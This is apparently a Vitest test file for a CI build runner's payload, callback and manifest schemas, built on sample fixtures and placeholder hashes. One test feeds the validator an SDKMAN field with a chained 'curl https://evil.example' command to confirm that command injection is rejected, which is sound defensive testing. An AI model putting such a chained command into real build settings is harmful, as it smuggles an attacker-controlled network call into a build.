import { describe, expect, it } from "vitest"

import { generateArtifactName, generateRunName } from "../src/names.js"
import { createManifestVersion } from "../src/artifacts.js"
import { buildPayloadSchema, callbackPayloadSchema, runnerManifestSchema } from "../src/schema.js"
import branchPayload from "./fixtures/branch-payload.json" with { type: "json" }
import invalidCommandPayload from "./fixtures/invalid-command-payload.json" with { type: "json" }
import releasePayload from "./fixtures/release-payload.json" with { type: "json" }
import tagPayload from "./fixtures/tag-payload.json" with { type: "json" }

const successCallbackPayload = {
  schema_version: 1,
  run_id: "runbranch001",
  profile_id: "config001",
  project_id: "project001",
  idempotency_key: "auto-build-project001-stable-branch-main-abcdef1",
  runner_repo: "ybw0014/guizhan-resources-ci",
  runner_workflow: "build.yml",
  workflow_run_id: 123456789,
  workflow_attempt: 1,
  conclusion: "success",
  manifest_artifact_name: "auto-build-project001-stable-branch-main-abcdef1-manifest.json",
  manifest_artifact_id: 987654321,
  artifact_names: ["auto-build-project001-stable-branch-main-abcdef1-example-plugin.jar"],
}

const failureCallbackPayload = {
  schema_version: 1,
  run_id: "runbranch001",
  profile_id: "config001",
  project_id: "project001",
  idempotency_key: "auto-build-project001-stable-branch-main-abcdef1",
  runner_repo: "ybw0014/guizhan-resources-ci",
  runner_workflow: "build.yml",
  workflow_run_id: 123456789,
  workflow_attempt: 2,
  conclusion: "failure",
  manifest_artifact_name: "auto-build-project001-stable-branch-main-abcdef1-manifest.json",
  artifact_names: [],
  error_message: "Build failed",
}

const manifestPayload = {
  run_id: "runbranch001",
  project_id: "project001",
  channel: "stable",
  source_mode: "branch",
  source_identifier: "main",
  source_commit_sha: "abcdef1234567890abcdef1234567890abcdef12",
  build_profile: "default",
  version: "1-0-0",
  name: "Example Plugin",
  changelog: "Initial auto build.",
  minecraft_versions: ["1.20.4"],
  platforms: ["paper"],
  dependencies: [],
  artifacts: [
    {
      name: "example-plugin.jar",
      url: "https://github.com/ybw0014/guizhan-resources-ci/actions/runs/123/artifacts/456",
      sha1: "0123456789abcdef0123456789abcdef01234567",
      sha256: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
      size: 1024,
    },
  ],
}

describe("buildPayloadSchema", () => {
  it("parses a branch payload and keeps all contract fields", () => {
    const payload = buildPayloadSchema.parse(branchPayload)

    expect(payload).toMatchObject({
      schema_version: 1,
      run_id: "runbranch001",
      profile_id: "config001",
      project_id: "project001",
      channel: "stable",
      idempotency_key: "auto-build-project001-stable-branch-main-abcdef1",
      source_repo: "ybw0014/example-plugin",
      source_mode: "branch",
      source_identifier: "main",
      source_commit_sha: "abcdef1234567890abcdef1234567890abcdef12",
      build_profile: "default",
      runner_repo: "ybw0014/guizhan-resources-ci",
      runner_workflow: "build.yml",
      build_command: "mvn package",
      java_version: "25",
      maven_version: "3.9.9",
      pnpm_version: "11.1.2",
      callback_url: "https://resources.guizhan.example/v1/projects/project001/automation/runs/runbranch001/callback",
      artifact_retention: 7,
    })
  })

  it("keeps new payload metadata optional and accepts dot versions", () => {
    expect(buildPayloadSchema.parse(branchPayload).source_commit_message).toBeUndefined()
    expect(
      buildPayloadSchema.parse({
        ...branchPayload,
        source_resolved_identifier: "v1.2.0",
        source_commit_message: "feat: metadata",
        channel_version_count: 0,
        version_template: "{jar_version}",
        name_template: "{identifier}",
        changelog_template: "{commit_message}",
      })
    ).toMatchObject({ source_resolved_identifier: "v1.2.0", channel_version_count: 0 })
    expect(runnerManifestSchema.safeParse({ ...manifestPayload, version: "1.0.0" }).success).toBe(true)
  })

  it("preserves the canonical Minecraft version catalog contract field", () => {
    expect(
      buildPayloadSchema.parse({ ...branchPayload, canonical_minecraft_versions: ["1.20", "1.20.4"] })
        .canonical_minecraft_versions
    ).toEqual(["1.20", "1.20.4"])
  })

  it("preserves legacy version sanitization", () => {
    expect(
      createManifestVersion(buildPayloadSchema.parse({ ...branchPayload, source_identifier: "release/1.0.0" }))
    ).toBe("branch-release-1-0-0-abcdef1")
  })

  it("parses a tag payload", () => {
    expect(buildPayloadSchema.parse(tagPayload).source_mode).toBe("tag")
  })

  it("parses a release payload", () => {
    expect(buildPayloadSchema.parse(releasePayload).source_mode).toBe("release")
  })

  it("rejects an invalid build command", () => {
    const result = buildPayloadSchema.safeParse(invalidCommandPayload)

    expect(result.success).toBe(false)
    expect(result.error?.issues.some((issue) => issue.path.includes("build_command"))).toBe(true)
  })

  it("rejects a short source commit SHA", () => {
    const result = buildPayloadSchema.safeParse({
      ...branchPayload,
      source_commit_sha: "abcdef1234567890",
    })

    expect(result.success).toBe(false)
    expect(result.error?.issues.some((issue) => issue.path.includes("source_commit_sha"))).toBe(true)
  })

  it("accepts a single SDKMAN install or use command", () => {
    const result = buildPayloadSchema.safeParse({
      ...branchPayload,
      sdkman_custom: "sdk install java 25-tem",
    })

    expect(result.success).toBe(true)
  })

  it("rejects SDKMAN shell syntax", () => {
    const result = buildPayloadSchema.safeParse({
      ...branchPayload,
      sdkman_custom: "sdk install java 25-tem; curl https://evil.example",
    })

    expect(result.success).toBe(false)
    expect(result.error?.issues.some((issue) => issue.path.includes("sdkman_custom"))).toBe(true)
  })

  it("rejects unsupported SDKMAN candidates", () => {
    const result = buildPayloadSchema.safeParse({
      ...branchPayload,
      sdkman_custom: "sdk install groovy 4.0.0",
    })

    expect(result.success).toBe(false)
    expect(result.error?.issues.some((issue) => issue.path.includes("sdkman_custom"))).toBe(true)
  })
})

describe("callbackPayloadSchema", () => {
  it("parses a success callback payload", () => {
    expect(callbackPayloadSchema.parse(successCallbackPayload).conclusion).toBe("success")
  })

  it("parses a failure callback payload", () => {
    expect(callbackPayloadSchema.parse(failureCallbackPayload).conclusion).toBe("failure")
  })
})

describe("runnerManifestSchema", () => {
  it("parses a runner manifest compatible with the consumer contract", () => {
    const manifest = runnerManifestSchema.parse(manifestPayload)

    expect(manifest.artifacts[0]).toMatchObject({
      name: "example-plugin.jar",
      sha1: "0123456789abcdef0123456789abcdef01234567",
      sha256: "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
      size: 1024,
    })
  })

  it("accepts omitted Minecraft versions so ingestion can use channel defaults", () => {
    const { minecraft_versions: _minecraftVersions, ...manifestWithoutMinecraftVersions } = manifestPayload

    expect(runnerManifestSchema.parse(manifestWithoutMinecraftVersions).minecraft_versions).toBeUndefined()
  })
})

describe("name helpers", () => {
  it("keep the run name free of user input and the artifact name keyed", () => {
    const idempotencyKey = "auto-build-project001-stable-branch-main-abcdef1"

    expect(generateRunName("runbranch001")).toBe("Automation Run runbranch001")
    expect(generateRunName("runbranch001")).not.toContain(idempotencyKey)
    expect(generateArtifactName(idempotencyKey, "manifest.json")).toContain(idempotencyKey)
  })
})
